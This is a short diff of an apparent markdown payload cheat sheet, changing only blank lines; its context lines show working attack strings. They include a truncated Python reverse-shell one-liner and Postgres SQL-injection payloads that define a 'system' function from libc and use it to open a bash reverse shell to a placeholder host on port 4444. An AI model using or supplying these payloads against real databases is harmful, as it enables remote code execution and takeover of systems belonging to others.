@@ -39,7 +39,6 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 EOF
 ```
 
-
 ## Postgres
 
 ```sql
@@ -52,7 +51,6 @@ EOF
 '; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; --
 
 '; SELECT system('bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'); --
-
 ```
 
 ## MySQl
